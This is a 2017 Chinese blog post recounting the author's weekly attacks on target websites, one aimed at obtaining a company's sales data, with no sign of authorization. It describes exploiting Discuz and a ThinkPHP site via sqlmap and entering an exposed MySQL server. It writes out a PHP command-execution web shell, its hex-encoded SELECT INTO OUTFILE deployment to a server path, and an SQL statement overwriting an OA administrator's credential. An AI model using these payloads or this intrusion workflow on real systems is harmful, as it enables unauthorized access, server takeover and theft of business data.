一星期实战总结（七）

发表于 2017-05-09   |   分类于 网络安全   |  

不打算每个星期创建新的日志写总结了，不然整个博客全是这种类型。

五月

（第一周）

搞某目标站，需要拿到某些销售数据，给了一个网站，大概分析了下没有什么利用，也没有内网所以暂时就先没看，其次邮箱也是腾讯的,完全是什么信息都没有这让我很头疼又要指定这个目标站，后来某人给了意见。所以买了一些硬件设备，所以这个星期六天除了学习Python外会研究一下。

这星期的事情还是挺多的，各种站点都很难搞，这次是给了某站，程序用的是joomla,通过whatweb查看发现是joomla 1.5，结果去找了一些getshell没法利用成功，不过这个站点真是太神奇了不知道站长是怎么做到的，我很是好奇。 1.目标站无法ping通 2.无法扫描端口，连telnet domain 80都不能访问这我就好奇怎么访问网站了，这里我猜测是先判断浏览器才能访问80端口吧，后来实在没有办法去搞了旁间，一个一个翻，翻到一个熟悉的页面discuz论坛，马上找出利用工具，然后显示出错。

测试了挺久，后来测试通过手工提交，完美获得密码。
有时候工具是不能相信的，特别是遇到一些变态的站点，多尝试几次总是没有错的。

顺利解出密码登后台获取Shell，这里拿Shell花了挺长时间，主要自己以前没有研究过Discuz这些东西，所以花了时间查找各种资料拿Shell。

总结：一个星期下来，其实很多时间都花在各种想或者找资料上,自己的实战经验还是有很多不足的地方，只能好好锻炼，多想多做多实战了，有时候思路死了，只有自己想出来的方法才是属于自己的，刚开始就感觉已经输了，都用着别人的套路。

又过了几天之后，还是决定再一试，发现目标站的二级目录有个Discuz论坛，不过是关闭状态所以也访问不了，这时候对照着Discuz7.2程序目录一个一个去尝试，发现某一个文件报路径。

(第三、四周)

这两个星期搞站没有什么进展，当所有的信息收集之后没有发现可利用点时，这时候就大部分时间在浪费时间在重复着做着同样的事情，我觉得很没有必要，这两个星期下来很有必要把自己的扫描目录字典、各类服务密码的字典还需再针对目标性的加强一下。
对每个目标要深度分析、以及每一步的操作都需要关联以及联想。

七月

之前搞了很多东西不适合写出来，有些搞完之后并没有整理，主要还是懒。

某目标站打开提示：

判断IP为：

进行端口扫描发现官方网站在9095端口
http://domain:9095

利用Thinkphp框架，不过后来发现网站上的URL并没有做任何的过滤，

直接sqlmap，不过通过SQLMAP并不可以直接写Shell，所以获取了后台的密码。
发现后台登录的验证码无法加载。

通过端口扫描也发现了3306端口，直接获取数据库密码，并支持外链直接进数据库。
之前也爆之前爆有路径，直拉select into outfile写Shell。
发现写进行的都会被删除，发现一些正常文件则没有被删除应该是有杀软或者其它。

之后发现其它端口开放着OA系统，如果能进入OA就不需要获取服务器权限了。

密码无解。
这里打算修改管理员密码:

UPDATE ORG_PRINCIPAL SET CREDENTIAL_VALUE=’L0tEW5Yk+cM2RjWYC8z1dYgp0c0=’ WHERE ID=26 AND LOGIN_NAME=’system’;

L0tEW5Yk+cM2RjWYC8z1dYgp0c0=密码为system，当修改完还是无法生效需要重启软件服务清除缓存才可以实现，所以这里直接修改数据库无效。

继续写Shell
<?php echo \'<pre>\';system($_GET[\'cmd\']); echo \'</pre>\'; ?>
转换成十六进制数据库写Shell

Select 0x3c3f706870206563686f205c273c7072653e5c273b73797374656d28245f4745545b5c27636d645c275d293b206563686f205c273c2f7072653e5c273b203f3e into outfile ‘D:\domain\ThinkPHP\Library\Think\mm.php’

执行命令直接是system最高权限。
